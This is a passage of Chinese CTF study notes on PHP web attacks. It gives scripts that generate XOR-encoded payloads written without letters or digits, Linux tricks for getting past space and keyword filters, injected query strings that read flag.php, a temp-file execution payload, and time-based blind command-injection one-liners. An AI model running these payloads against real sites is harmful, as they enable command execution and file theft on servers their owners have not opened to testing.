上面和下面异或出来能得到中间这层</span></span><br><span class="line">-------------</span><br><span class="line"><span class="number">0111</span> <span class="number">0000</span> %<span class="number">70</span> <span class="comment"># p</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=&gt;h</span></span><br><span class="line"><span class="number">1111</span> <span class="number">1010</span> %fa </span><br><span class="line"><span class="number">1001</span> <span class="number">0010</span> %<span class="number">92</span></span><br><span class="line">------------</span><br><span class="line"><span class="number">0110</span> <span class="number">1000</span> %<span class="number">68</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将信将疑的实验了下效果：</span></span><br><span class="line">$ php -r <span class="string">&quot;echo urldecode(&#x27;%fa%fa&#x27;)^urldecode(&#x27;%8a%92&#x27;);&quot;</span></span><br><span class="line">ph</span><br><span class="line"><span class="comment"># 真的做到了！！！</span></span><br><span class="line"></span><br><span class="line">利用php脚本，跑出的能显示的ascii码二进制在<span class="number">8</span>bit当中也全是首位<span class="number">0</span></span><br><span class="line">当首位大于<span class="number">1</span>时，必定是大于ascii码的。</span><br><span class="line"><span class="comment"># 跑出来的结果在这个题解最下面那儿</span></span><br><span class="line"><span class="comment"># 能跑出两个，就代表能跑出全部的phpinfo！而且不依赖 &quot;~&quot; (取反字符)</span></span><br></pre></td></tr></table></figure>

<p>php脚本，win cmd跑即可：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Please give me the key string: &quot;</span>;</span><br><span class="line">    <span class="comment"># 获取输入</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">rtrim</span>(<span class="title function_ invoke__">fgets</span>(STDIN), <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">    <span class="comment"># 输出异或后的参数</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;value: (&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%fa&#x27;</span>) ^ <span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%&#x27;</span> . <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$a</span>[<span class="variable">$i</span>])));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;^&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;%fa&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;)&#x27;</span> . PHP_EOL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>具体的可以使用的ascii码值：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">00100000</span>                <span class="number">20</span></span><br><span class="line"><span class="number">00100001</span>        !       <span class="number">21</span></span><br><span class="line"><span class="number">00100010</span>        <span class="string">&quot;       22</span></span><br><span class="line"><span class="string">00100011        #       23</span></span><br><span class="line"><span class="string">00100100        $       24</span></span><br><span class="line"><span class="string">00100101        %       25</span></span><br><span class="line"><span class="string">00100110        &amp;       26</span></span><br><span class="line"><span class="string">00100111        &#x27;       27</span></span><br><span class="line"><span class="string">00101000        (       28</span></span><br><span class="line"><span class="string">00101001        )       29</span></span><br><span class="line"><span class="string">00101010        *       2a</span></span><br><span class="line"><span class="string">00101011        +       2b</span></span><br><span class="line"><span class="string">00101100        ,       2c</span></span><br><span class="line"><span class="string">00101101        -       2d</span></span><br><span class="line"><span class="string">00101110        .       2e</span></span><br><span class="line"><span class="string">00101111        /       2f</span></span><br><span class="line"><span class="string">00110000        0       30</span></span><br><span class="line"><span class="string">00110001        1       31</span></span><br><span class="line"><span class="string">00110010        2       32</span></span><br><span class="line"><span class="string">00110011        3       33</span></span><br><span class="line"><span class="string">00110100        4       34</span></span><br><span class="line"><span class="string">00110101        5       35</span></span><br><span class="line"><span class="string">00110110        6       36</span></span><br><span class="line"><span class="string">00110111        7       37</span></span><br><span class="line"><span class="string">00111000        8       38</span></span><br><span class="line"><span class="string">00111001        9       39</span></span><br><span class="line"><span class="string">00111010        :       3a</span></span><br><span class="line"><span class="string">00111011        ;       3b</span></span><br><span class="line"><span class="string">00111100        &lt;       3c</span></span><br><span class="line"><span class="string">00111101        =       3d</span></span><br><span class="line"><span class="string">00111110        &gt;       3e</span></span><br><span class="line"><span class="string">00111111        ?       3f</span></span><br><span class="line"><span class="string">01000000        @       40</span></span><br><span class="line"><span class="string">01000001        A       41</span></span><br><span class="line"><span class="string">01000010        B       42</span></span><br><span class="line"><span class="string">01000011        C       43</span></span><br><span class="line"><span class="string">01000100        D       44</span></span><br><span class="line"><span class="string">01000101        E       45</span></span><br><span class="line"><span class="string">01000110        F       46</span></span><br><span class="line"><span class="string">01000111        G       47</span></span><br><span class="line"><span class="string">01001000        H       48</span></span><br><span class="line"><span class="string">01001001        I       49</span></span><br><span class="line"><span class="string">01001010        J       4a</span></span><br><span class="line"><span class="string">01001011        K       4b</span></span><br><span class="line"><span class="string">01001100        L       4c</span></span><br><span class="line"><span class="string">01001101        M       4d</span></span><br><span class="line"><span class="string">01001110        N       4e</span></span><br><span class="line"><span class="string">01001111        O       4f</span></span><br><span class="line"><span class="string">01010000        P       50</span></span><br><span class="line"><span class="string">01010001        Q       51</span></span><br><span class="line"><span class="string">01010010        R       52</span></span><br><span class="line"><span class="string">01010011        S       53</span></span><br><span class="line"><span class="string">01010100        T       54</span></span><br><span class="line"><span class="string">01010101        U       55</span></span><br><span class="line"><span class="string">01010110        V       56</span></span><br><span class="line"><span class="string">01010111        W       57</span></span><br><span class="line"><span class="string">01011000        X       58</span></span><br><span class="line"><span class="string">01011001        Y       59</span></span><br><span class="line"><span class="string">01011010        Z       5a</span></span><br><span class="line"><span class="string">01011011        [       5b</span></span><br><span class="line"><span class="string">01011100        \       5c</span></span><br><span class="line"><span class="string">01011101        ]       5d</span></span><br><span class="line"><span class="string">01011110        ^       5e</span></span><br><span class="line"><span class="string">01011111        _       5f</span></span><br><span class="line"><span class="string">01100000        `       60</span></span><br><span class="line"><span class="string">01100001        a       61</span></span><br><span class="line"><span class="string">01100010        b       62</span></span><br><span class="line"><span class="string">01100011        c       63</span></span><br><span class="line"><span class="string">01100100        d       64</span></span><br><span class="line"><span class="string">01100101        e       65</span></span><br><span class="line"><span class="string">01100110        f       66</span></span><br><span class="line"><span class="string">01100111        g       67</span></span><br><span class="line"><span class="string">01101000        h       68</span></span><br><span class="line"><span class="string">01101001        i       69</span></span><br><span class="line"><span class="string">01101010        j       6a</span></span><br><span class="line"><span class="string">01101011        k       6b</span></span><br><span class="line"><span class="string">01101100        l       6c</span></span><br><span class="line"><span class="string">01101101        m       6d</span></span><br><span class="line"><span class="string">01101110        n       6e</span></span><br><span class="line"><span class="string">01101111        o       6f</span></span><br><span class="line"><span class="string">01110000        p       70</span></span><br><span class="line"><span class="string">01110001        q       71</span></span><br><span class="line"><span class="string">01110010        r       72</span></span><br><span class="line"><span class="string">01110011        s       73</span></span><br><span class="line"><span class="string">01110100        t       74</span></span><br><span class="line"><span class="string">01110101        u       75</span></span><br><span class="line"><span class="string">01110110        v       76</span></span><br><span class="line"><span class="string">01110111        w       77</span></span><br><span class="line"><span class="string">01111000        x       78</span></span><br><span class="line"><span class="string">01111001        y       79</span></span><br><span class="line"><span class="string">01111010        z       7a</span></span><br><span class="line"><span class="string">01111011        &#123;       7b</span></span><br><span class="line"><span class="string">01111100        |       7c</span></span><br><span class="line"><span class="string">01111101        &#125;       7d</span></span><br><span class="line"><span class="string">01111110        ~       7e</span></span><br></pre></td></tr></table></figure>

<h4 id="脚本2"><a href="#脚本2" class="headerlink" title="脚本2"></a>脚本2</h4><p>异或注入的参照：<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/108569080">https://blog.csdn.net/miuzzx/article/details/108569080</a></p>
<p>下面是摘自其他人的参照：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;assert&quot;</span></span><br><span class="line">strlist = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>, <span class="number">44</span>, <span class="number">45</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">58</span>, <span class="number">59</span>, <span class="number">60</span>, <span class="number">61</span>, <span class="number">62</span>, <span class="number">63</span>, <span class="number">64</span>, <span class="number">91</span>, <span class="number">93</span>, <span class="number">94</span>, <span class="number">95</span>, <span class="number">96</span>, <span class="number">123</span>, <span class="number">124</span>, <span class="number">125</span>, <span class="number">126</span>, <span class="number">127</span>]</span><br><span class="line"><span class="comment">#strlist是ascii表中所有非字母数字的字符十进制</span></span><br><span class="line">str1,str2 = <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strlist:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> strlist:</span><br><span class="line">            <span class="keyword">if</span>(i ^ j == <span class="built_in">ord</span>(char)):</span><br><span class="line">                i = <span class="string">&#x27;%&#123;:0&gt;2&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(i)[<span class="number">2</span>:])</span><br><span class="line">                j = <span class="string">&#x27;%&#123;:0&gt;2&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(j)[<span class="number">2</span>:])</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;(&#x27;&#123;0&#125;&#x27;^&#x27;&#123;1&#125;&#x27;)&quot;</span>.<span class="built_in">format</span>(i,j),end=<span class="string">&quot;.&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="关于-autoload魔术方法"><a href="#关于-autoload魔术方法" class="headerlink" title="关于__autoload魔术方法"></a>关于__autoload魔术方法</h2><p>具体参照：<a target="_blank" rel="noopener" href="https://juejin.cn/post/7016944635851309070">https://juejin.cn/post/7016944635851309070</a></p>
<blockquote>
<p><strong>__autoload<code>魔术方法从PHP7.2.0开始被废弃，并且在PHP8.0.0以上的版本完全废除。取而代之的则是</code>spl_autoload_register</strong></p>
<p>由此可见，<code>__autoload</code>魔术方法需要有一个类名的参数，使用这个魔术方法之后即可自动加载相应的类。</p>
<p>虽然说是自动，但是本质上还是需要我们指定类名，<code>__autoload</code>才会为我们包含文件，自动加载相应的类。</p>
<p><code>__autoload</code>魔术方法即使在类里面，但是由于这是一个全局的魔术方法，也就是说只要调用未知名称的类，都会调用<code>__autoload</code>这个魔术方法，而<code>__autoload</code>魔术方法将传入的参数作为命令执行。（这个类一旦引用就是全局性质的。）</p>
</blockquote>
<p>经典案例：</p>
<p>首先假设我们有<code>autoload.php</code>主业务逻辑代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;class_A.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;class_B.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;class_C.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;class&quot;</span>] === <span class="string">&#x27;A&#x27;</span>)&#123;</span><br><span class="line">	<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;class&quot;</span>] === <span class="string">&#x27;B&#x27;</span>)&#123;</span><br><span class="line">	<span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;class&quot;</span>] === <span class="string">&#x27;C&#x27;</span>)&#123;</span><br><span class="line">	<span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将<code>autoload.php</code>代码修改后：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$classname</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">require</span>(<span class="string">&quot;class_<span class="subst">$classname</span>.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;class&quot;</span>] === <span class="string">&#x27;A&#x27;</span>)&#123;</span><br><span class="line">	<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;class&quot;</span>] === <span class="string">&#x27;B&#x27;</span>)&#123;</span><br><span class="line">	<span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;class&quot;</span>] === <span class="string">&#x27;C&#x27;</span>)&#123;</span><br><span class="line">	<span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="解码类"><a href="#解码类" class="headerlink" title="解码类"></a>解码类</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">url解码：https://c.runoob.com/front-end/3602/</span><br></pre></td></tr></table></figure>



<h2 id="Linux命令"><a href="#Linux命令" class="headerlink" title="Linux命令"></a>Linux命令</h2><h3 id="Linux特殊利用点"><a href="#Linux特殊利用点" class="headerlink" title="Linux特殊利用点"></a>Linux特殊利用点</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 简单功能阐释：</span></span><br><span class="line"><span class="number">1</span>. <span class="string">&quot;.&quot;</span> :能作为字符串使用，同时也能将某个文件内的所有sh挨个执行。</span><br><span class="line">    <span class="comment"># . flag</span></span><br><span class="line">    然后就是执行<span class="string">&#x27;flag&#x27;</span>文件下的内容,使用的是sh执行</span><br><span class="line">    </span><br><span class="line"><span class="number">2</span>. <span class="string">&quot;?&quot;</span> :通配符，能匹配任意字符</span><br><span class="line">    <span class="comment"># /???/???</span></span><br><span class="line">    然后可以匹配上 /tmp/php</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>. <span class="string">&quot;/tmp/&quot;</span>:文件上传临时文件夹</span><br><span class="line"><span class="number">4</span>. <span class="string">&quot;[@-[]&quot;</span>:这是一个范围，囊括的是大写字母的A-Z</span><br><span class="line"></span><br><span class="line"><span class="comment">#无字符的异或脚本</span></span><br><span class="line"><span class="comment">#利用临时文件执行命令</span></span><br><span class="line"><span class="comment">//知道临时文件的位置，利用点进行执行</span></span><br><span class="line">https:<span class="comment">//blog.csdn.net/qq_46091464/article/details/108513145</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 涉及的思路   设计插入后门=&gt; 从后门获取命令行窗口=&gt; 查看当前环境的变量</span></span><br><span class="line">env         <span class="comment">//查看当前环境变量</span></span><br><span class="line">wget		<span class="comment">//文件下载命令</span></span><br><span class="line">    wget -r &lt;url/.git&gt;</span><br><span class="line">git			<span class="comment">//.git文件查询工具</span></span><br><span class="line">    git reflog <span class="comment">//查询日志</span></span><br><span class="line">    git show &lt;分支编号&gt;</span><br><span class="line"></span><br><span class="line">;     前面的执行完执行后面的</span><br><span class="line">|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         </span><br><span class="line">||    当前面的执行出错时（为假）执行后面的</span><br><span class="line">&amp;     将任务置于后台执行</span><br><span class="line">&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真</span><br><span class="line"></span><br><span class="line">起因：在URL当中的普通输入的空格被过滤导致命令无法执行，需寻找替代品</span><br><span class="line"></span><br><span class="line">IFS: Linux内置环境变量</span><br><span class="line">$&#123;IFS&#125;$<span class="number">9</span></span><br><span class="line">&#123;IFS&#125;</span><br><span class="line"><span class="variable">$IFS</span></span><br><span class="line">$&#123;IFS&#125;	<span class="comment"># 代替分隔符,也代替空格等。</span></span><br><span class="line">$IFS$<span class="number">1</span> <span class="comment">//$1改成$加其他数字貌似都行</span></span><br><span class="line">IFS</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  <span class="comment">//用逗号实现了空格功能，需要用&#123;&#125;括起来</span></span><br><span class="line">%<span class="number">20</span>   (space)</span><br><span class="line">%<span class="number">09</span>   (tab)</span><br><span class="line">X=$<span class="string">&#x27;cat\x09./flag.php&#x27;</span>;<span class="variable">$X</span>       （\x09表示tab，也可以用\x20）</span><br><span class="line"></span><br><span class="line">url编码</span><br><span class="line">%<span class="number">0</span>a  （换行）</span><br><span class="line">%<span class="number">0</span>d  （回车）</span><br><span class="line">    </span><br><span class="line">` `             <span class="comment"># 命令执行</span></span><br><span class="line">nl&lt;fla<span class="string">&#x27;&#x27;</span>g.php   <span class="comment"># 读取文件内容</span></span><br><span class="line"><span class="comment">// nl真够神奇的，跨了一大堆函数没被限制死</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 占位显示文件内容</span></span><br><span class="line"><span class="comment">// 原理还是正则表达式的方法，？代表一个位置</span></span><br><span class="line">原始：</span><br><span class="line">    cat flag.php</span><br><span class="line">转换：</span><br><span class="line">    ?at$&#123;IFS&#125;f???????</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 字符执行命令</span></span><br><span class="line"><span class="comment"># 下面的执行命令能实现的效果是：逐行执行sh代码</span></span><br><span class="line"><span class="comment"># . flag</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 使用临时文件存储的地方执行文件</span></span><br><span class="line">/?c=.+/???/????????[@-[]</span><br><span class="line"><span class="comment">// 展示数组结构</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">var_export</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>),<span class="literal">true</span>));</span><br><span class="line"><span class="comment"># include函数替代品</span></span><br><span class="line"><span class="keyword">require</span>()  =&gt; <span class="keyword">include</span>()</span><br><span class="line"><span class="comment">// 避开缓冲区刷新：</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);<span class="keyword">exit</span>();</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 尝试覆盖</span></span><br><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>;a=f;cat$IFS$<span class="number">1</span><span class="variable">$alag</span>.php        错误</span><br><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>;a=l;cat$IFS$<span class="number">1</span>f<span class="variable">$aag</span>.php        无</span><br><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>;a=a;cat$IFS$<span class="number">1</span>fl<span class="variable">$ag</span>.php        错误</span><br><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>;a=g;cat$IFS$<span class="number">1</span>fla<span class="variable">$a</span>.php        有flag</span><br><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>;a=fl;b=ag;cat$IFS$<span class="number">1</span>$a<span class="variable">$b</span>.php   错误</span><br><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>;b=ag;a=fl;cat$IFS$<span class="number">1</span>$a<span class="variable">$b</span>.php   有flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注释当中找到flag</span></span><br><span class="line">flag&#123;<span class="number">7</span>bbe778b-<span class="number">9</span>dda-<span class="number">4980</span>-<span class="number">8532</span>-<span class="number">9</span>deb7904bd14&#125;</span><br><span class="line">                    </span><br><span class="line"><span class="comment">// 学到了Linux执行命令的新姿势</span></span><br><span class="line">[root@localhost ~]<span class="comment"># echo $()</span></span><br><span class="line">[root@localhost ~]<span class="comment"># echo $(($()))</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line">[root@localhost ~]<span class="comment"># echo $((~$(())))</span></span><br><span class="line">-<span class="number">1</span></span><br><span class="line">[root@localhost ~]<span class="comment"># echo $((~$(())))$((~$(())))</span></span><br><span class="line">-<span class="number">1</span>-<span class="number">1</span></span><br><span class="line">[root@localhost ~]<span class="comment"># echo $(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))</span></span><br><span class="line">-<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面的$&#123;_&#125;是依赖上一步执行的，咋一看有些误导性</span></span><br><span class="line">[root@localhost ~]<span class="comment"># echo $&#123;_&#125;</span></span><br><span class="line">-<span class="number">2</span></span><br><span class="line">[root@localhost ~]<span class="comment"># echo $(($&#123;_&#125;))</span></span><br><span class="line">-<span class="number">2</span></span><br><span class="line">[root@localhost ~]<span class="comment"># echo $((~$(($&#123;_&#125;))))</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">                    </span><br></pre></td></tr></table></figure>

<h3 id="Linux内置命令"><a href="#Linux内置命令" class="headerlink" title="Linux内置命令"></a>Linux内置命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">文件和目录相关命令：</span><br><span class="line">    <span class="built_in">ls</span>：列出目录内容。</span><br><span class="line">    <span class="built_in">cat</span>：显示文件内容。</span><br><span class="line">    <span class="built_in">od</span>：以不同格式显示文件内容。</span><br><span class="line"></span><br><span class="line">文本处理命令：</span><br><span class="line">    <span class="built_in">tac</span>：反向显示文件内容。</span><br><span class="line">    <span class="built_in">nl</span>：给文件行添加行号。</span><br><span class="line">    more：分页显示文件内容。</span><br><span class="line">    less：按需显示文件内容。</span><br><span class="line">    <span class="built_in">head</span>：显示文件开头部分。</span><br><span class="line">    <span class="built_in">tail</span>：显示文件结尾部分。</span><br><span class="line">    grep：在文件中搜索指定模式。</span><br><span class="line">    sed：流编辑器，用于处理和转换文本。</span><br><span class="line">    <span class="built_in">tee</span>: 从标准输入读取数据，并将其复制到一个或多个文件和/或标准输出</span><br><span class="line">    	<span class="built_in">nl</span> flag.php | <span class="built_in">tee</span> flag.txt</span><br><span class="line">    <span class="built_in">nl</span>: 读取指定文件内容并且添加行号再进行输出。</span><br><span class="line"></span><br><span class="line">网络相关命令：</span><br><span class="line">    wget：从网络上下载文件。</span><br><span class="line"></span><br><span class="line">编辑器和浏览器命令：</span><br><span class="line">    vi：文本编辑器。</span><br><span class="line">    emacs：文本编辑器。</span><br><span class="line">    nano：文本编辑器。</span><br><span class="line"></span><br><span class="line">压缩和解压命令：</span><br><span class="line">    bzmore：对bzip2压缩文件进行分页查看。</span><br><span class="line">    bzless：对bzip2压缩文件进行按需查看。</span><br><span class="line"></span><br><span class="line">工具命令：</span><br><span class="line">    pcre：Perl兼容的正则表达式工具。</span><br><span class="line">    <span class="built_in">paste</span>：合并文件内容。</span><br><span class="line">    diff：比较两个文件的差异。</span><br><span class="line">    file：确定文件类型。</span><br><span class="line">    <span class="built_in">echo</span>：输出文本。</span><br><span class="line">    sh：Shell解释器。</span><br></pre></td></tr></table></figure>

<h3 id="Linux命令盲注"><a href="#Linux命令盲注" class="headerlink" title="Linux命令盲注"></a>Linux命令盲注</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">awk NR==1： 按行读取的办法</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cut</span>: 对字符串进行切割</span> </span><br><span class="line">ls /|awk &quot;NR==1&quot;|cut -c 1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">完整的<span class="keyword">if</span>语句，判断目录用的</span></span><br><span class="line">if [ `ls / | awk &quot;NR==2&quot; | cut -c 1` == &quot;b&quot; ];then sleep 3;fi</span><br><span class="line">if [ `cat /f149_15_h3r3 | awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#x27;&#123;2&#125;&#x27; ];then sleep 6;fi</span><br><span class="line">if [ `ls / | awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#x27;&#123;2&#125;&#x27; ];then sleep 6;fi</span><br><span class="line">if [ `cat /f149_15_h3r3 | awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125; | xxd -p | tr -d &#x27;0a&#x27;` == &#x27;&#123;2&#125;&#x27; ];then sleep 6;fi</span><br></pre></td></tr></table></figure>



<h2 id="Linux命令绕过"><a href="#Linux命令绕过" class="headerlink" title="Linux命令绕过"></a>Linux命令绕过</h2><p>膜拜大佬，不知道为什么崩了，先记下：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-chenxs/p/11978488.html#:~:text=%E5%89%8D%E8%A8%80%EF%BC%9A%20%E5%81%9Actf%E6%97%B6%E5%B8%B8%E5%B8%B8%E4%BC%9A%E9%81%87%E5%88%B0%E4%B8%80%E4%BA%9B%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E5%B0%86%E4%B8%80%E4%BA%9Blinux%E5%91%BD%E4%BB%A4%E7%BB%99%E8%BF%87%E6%BB%A4%E6%8E%89%EF%BC%8C%E8%BF%99%E9%87%8C%E5%B0%86%E6%80%BB%E7%BB%93%E4%B8%80%E4%BA%9B%E9%92%88%E5%AF%B9%E6%80%A7%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E3%80%82%20%E4%B8%80%E3%80%81%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87%EF%BC%9A%20%7Bcat%2Cflag.txt%7D%20cat%24,%7BIFS%7Dflag.txt%20cat%24IFS%249flag.txt%20cat%3Cflag.txt%20cat%3C%3Eflag.txt%20kg%3D">大佬博客点我</a></p>
<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="built_in">cat</span>,flag.txt&#125;</span><br><span class="line">  <span class="built_in">cat</span><span class="variable">$&#123;IFS&#125;</span>flag.txt</span><br><span class="line">  <span class="built_in">cat</span>$IFS<span class="variable">$9flag</span>.txt</span><br><span class="line">  <span class="built_in">cat</span>&lt;flag.txt</span><br><span class="line">  <span class="built_in">cat</span>&lt;&gt;flag.txt</span><br><span class="line"></span><br><span class="line">  kg=$<span class="string">&#x27;\x20flag.txt&#x27;</span>&amp;&amp;<span class="built_in">cat</span><span class="variable">$kg</span></span><br><span class="line">  (\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</span><br></pre></td></tr></table></figure>

<h3 id="敏感字符串绕过"><a href="#敏感字符串绕过" class="headerlink" title="敏感字符串绕过"></a>敏感字符串绕过</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">假设过滤了<span class="built_in">cat</span></span><br><span class="line"></span><br><span class="line">1.利用变量绕过：</span><br><span class="line"></span><br><span class="line">ac;b=at;$a<span class="variable">$b</span></span><br><span class="line"></span><br><span class="line">2.利用base编码绕过</span><br><span class="line"></span><br><span class="line">`<span class="built_in">echo</span> <span class="string">&#x27;Y2F0Cg==&#x27;</span> | <span class="built_in">base64</span> -d` test.txt</span><br><span class="line"></span><br><span class="line">3.连接符截断绕过：</span><br><span class="line"></span><br><span class="line"> c<span class="string">&#x27;a&#x27;</span>t test.txt</span><br><span class="line"> c\at test.txt</span><br><span class="line"> ca<span class="variable">$@t</span> test.txt</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

